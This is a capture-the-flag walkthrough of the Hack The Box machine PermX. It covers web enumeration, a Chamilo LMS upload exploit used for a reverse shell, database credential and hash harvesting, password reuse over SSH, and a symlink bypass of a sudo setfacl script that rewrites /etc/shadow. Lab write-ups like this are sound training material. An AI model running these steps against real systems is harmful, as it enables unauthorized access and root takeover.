## Reconnaissance

### nmap 

![](./IMG/0.png)
### Web 

![](./IMG/2.png)

![](./IMG/1.png)


### Gobuster - Path Traversal 

```
gobuster dir -u http://permx.htb -w /usr/share/wordlists/dirb/common.txt -o web.out
```

![](./IMG/3.png)

### ffuf - subdomain 

```
ffuf -c -u 'http://permx.htb' -H 'Host:FUZZ.permx.htb' -w /usr/share/seclists/Discovery/DNS/subdomain-top1million-5000.txt -fc 301,302 -mc all -fs 6182
```

![](./IMG/4.png)

> Find a subdomain

```
lms.permx.htb
```

### Enumerate subdomain 

![](./IMG/5.png)

## Exploit 

> Searching the exploit method or CVE which related to Chamilo 

1. [(GITHUB)CVE-2023-3533 - Chamilo LMS Unauthenticated Big Upload File RCE PoC](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)
2. [(GITHUB)CVE-2023-4220 RCE Chamilo 1.11.24](https://github.com/charlesgargasson/CVE-2023-4220)

> I tried to use 1st payload from github to get reverse shell  

![](./IMG/7.png)

![](./IMG/8.png)

![](./IMG/9.png)

![](./IMG/10.png)

![](./IMG/6.png)

### Reverse shell 

> Set up listener 

> Execute exploit code 

```
python main.py -u http://lms.permx.htb -a revshell 
```

![](./IMG/11.png)

![](./IMG/12.png)

![](./IMG/13.png)

![](./IMG/14.png)

3. Check listener 

![](./IMG/15.png)

## Low-Privilege Escalation 

> Currently, I got into target system
> The user is www-data 

![](./IMG/16.png)

> Checking the target user in home directory 
> But I don't have permission to access user - mtz's directory 

![](./IMG/17.png)

> Checking sudo permission 
> But the privilege is too low, I am not able to access or check it

![](./IMG/18.png)

> Checking the file which have SUID / SGID permission 

![](./IMG/19.png)

> Checking network status 

![](./IMG/20.png)

> Linpeas result 
> Find some credentials and sensitive information

![](./IMG/21.png)

![](./IMG/23.png)
![](./IMG/24.png)

![](./IMG/25.png)

> The most interesting file - cli-config.php 

![](./IMG/26.png)

> Following the code, I also check this file - configuration.php in /app/config

![](./IMG/22.png)

### Credentials / Sensitive information 

> DB Credential 

```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false; 
```

![](./IMG/27.png)

> FTP / SFTP

```
FTP_PASSWORD=gaufrette
SFTP_PASSWORD=gaufrette
```

![](./IMG/21.png)
### Data in Database 

> Login to DB 

```
mysql -h 127.0.0.1 -u chamilo -p
```

![](./IMG/28.png)

> List databases;

```
show databases;
```

![](./IMG/29.png)

> Change DB 

```
use chamilo
```

![](./IMG/30.png)

> List tables

```
show tables;
```

![](./IMG/31.png)

![](./IMG/32.png)

> Check table - user

```
select * from user;
```

![](./IMG/33.png)

> I got another user's credential 

```
admin - Miller Davis 
$2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra

anon - Anonymous Joe
$2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS

```

![](./IMG/34.png)

### Crack Credential 

> Save admin credential to files 

![](./IMG/35.png)

> Try to crack it by hashcat 
> but it failed ... 

```
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt
```

![](./IMG/36.png)

### Password Spray

> Using DB password to login to SSH with mtz user - success 

![](./IMG/37.png)

> Check current user 

![](./IMG/38.png)

> Get user flag 

![](./IMG/39.png)


## Privilege Escalation 

> With mtz's permission, I start to find out how to get root permission 
> Sudo permission list as follow 

![](./IMG/40.png)

> All the users in this server can execute acl.sh which locate in /opt without password.
> Checking acl.sh 

![](./IMG/41.png)

> Executing it will show the following usage information 

![](./IMG/42.png)

> With above information, I think this shell script aim to change the permission for specific file
> User need to provide which file they want to change 
> And this script use 'setfacl' command to change permission
> Let's check what is 'setfacl'

- [Linux ACL 檔案權限設定 setfacl、getfacl 指令使用教學與範例](https://officeguide.cc/linux-acl-access-control-list-setfacl-getfacl-command-tutorial/#google_vignette)
![](./IMG/43.png)

> With the following information, I should can specify a user (maybe root) then provide this user some permission to specify file

![](./IMG/44.png)

![](./IMG/45.png)

> Intuitively, I can change the permission to /bin/bash to execute
> Or I can change the root flag's permission 
> Or I can change the shadow file's permission then modify the content
> But when I tried to modify the root flag file's permission, it shows the following error 

```
sudo ./acl.sh root 777 /root/root.txt
sudo ./acl.sh root 777 /etc/shadow
```

![](./IMG/49.png)

> I also tried a lot of different technique to try to bypass 
> But all of them are failed

![](./IMG/51.png)

> I think the error caused by the path validation in target shell script

![](./IMG/50.png)

> I think I have to bypass the path validation, so I tried to set up link to the target file and let the link file locate in the valid path (Symlink Attack)
> I have to create a link file in /home/mtz (since other directory will response error like permission denied)

```
ln -s / root 
```

![](./IMG/52.png)

> Try again

```
sudo ./acl.sh root 777 /home/mtz/root/root.txt
sudo ./acl.sh root rwx /home/mtz/root/root.txt
sudo ./acl.sh root 777 /home/mtz/root/root/root.txt
sudo ./acl.sh root rwx /home/mtz/root/root/root.txt
```

> It gets another error message 

```
Target must be a file 
```

![](./IMG/46.png)

![](./IMG/56.png)

> Actually, I'm not sure why root.txt won't be read 
> According to the shell script content, this error caused by the file check. 

![](./IMG/53.png)

> if the target is not a file ... it will cause error.
> But ... root.txt should be a file ... 
> I change the link target direct to root.txt instead of the root directory 
> But it still failed

```

```


![](./IMG/54.png)

> Then I change the target to shadow file.
> I hope I can set the permission to shadow file
> Then change root password 
> First, I set up the link to /

```
ln -s / root
```

![](./IMG/55.png)

> Then execute the command from mtz's home directory
> The following 2 tests still failed

```
sudo /opt/acl.sh root 777 /home/mtz/root/etc/passwd
```

![](./IMG/57.png)
```
sudo /opt/acl.sh root rwx /home/mtz/root/etc/passwd
```

![](./IMG/58.png)

> Since I keep tried to set the permission to root user, it will provide several different error 
> Then I change the strategy, I tried to assign the permission to current user - mtz 
> Then ... it success 

```
sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
```

![](./IMG/59.png)

> Before executing, I can't read /etc/shadow 

![](./IMG/61.png)

> After the command succes, I can read /etc/shadow 

![](./IMG/60.png)

> I start to change root's password 

1. Using openssl to generate the password SHA256 value 
```
openssl passwd -6 rootroot
```

![](./IMG/62.png)

2.  Edit shadow file 

> Original shadow file 

![](./IMG/63.png)

> Modified shadow file 

![](./IMG/64.png)

3. Login to root user 

![](./IMG/65.png)

> Get root flag 

![](./IMG/66.png)

## Reference 

### Writeup

- [Hack The Box-PermX](https://blog.csdn.net/m0_52742680/article/details/140263797)
- [HTB: Permx Machine(CVE-2023–4220 Chamilo LMS)](https://medium.com/@0xhunterr/htb-permx-machine-cve-2023-4220-chamilo-lms-b263eebdb13d)
- [HTB Permx Write-up](https://medium.com/@anans1/htb-permx-write-up-0fc8cfbabdd7)

### Tool 

1. [ffuf 教學](https://blog.csdn.net/u010062917/article/details/120473487)
### CVE 

1. [(GITHUB)CVE-2023-3533 - Chamilo LMS Unauthenticated Big Upload File RCE PoC](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)
2. [(GITHUB)CVE-2023-4220 RCE Chamilo 1.11.24](https://github.com/charlesgargasson/CVE-2023-4220)
3. [(Article)CVE-2023-3533](https://starlabs.sg/advisories/23/23-3533/)
4. [(Article)CVE-2023-4220](https://starlabs.sg/advisories/23/23-4220/)
### setfacl

1. [Linux ACL 檔案權限設定 setfacl、getfacl 指令使用教學與範例](https://officeguide.cc/linux-acl-access-control-list-setfacl-getfacl-command-tutorial/#google_vignette)

### Linux basic 

- [How to create SHA512/SHA256/MD5 password hashes on command line](https://rakeshjain-devops.medium.com/how-to-create-sha512-sha256-md5-password-hashes-on-command-line-2223db20c08c)
- [Understanding /etc/shadow file format on Linux](https://www.cyberciti.biz/faq/understanding-etcshadow-file/#google_vignette)

![](./IMG/67.png)

![](./IMG/68.png)
### Symlink attack 


- [Symlink Attack: What is that?](https://mangohost.net/blog/symlink-attack-what-is-that/)

> What's symlink attack ?
> A symlink is a special type of file that acts as a pointer to another file or directory. It allows you to create a shortcut or alias to another file or directory. A symlink attack occurs when an attacker is able to manipulate the symbolic link to gain access to files or directories they shouldn’t have access to.
> The symlink attack takes advantage of the fact that the operating system does not differentiate between the original file and the symlink. When a program or user accesses the symlink, the operating system follows the symlink and accesses the target file or directory instead.

> Common Command 

![](./IMG/69.png)

> Attack use case 

- Gaining unauthorized access to sensitive files or directories.
- Escalating privileges by redirecting system files or directories.
- Manipulating file or directory permissions to bypass security measures.
- Exploiting vulnerable applications that follow symlinks without proper validation.

> Automatic symlink attack (Some idea)

- Write a script that automatically creates symlinks to important system files and directories to test for vulnerabilities.
- Develop a tool that scans a target system for vulnerable software that follows symlinks without proper validation.
- Create a script that checks the permissions of symbolic links and identifies potential security risks.

- [CAPEC-27: Leveraging Race Conditions via Symbolic Links](https://capec.mitre.org/data/definitions/27.html)

> This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to them. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attackers' Symlink link. If the attacker can insert malicious content in the temporary file they will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.

- [Symlink Attacks](https://www.cybrary.it/blog/symlink-attacks)

###### tags: `HackTheBox`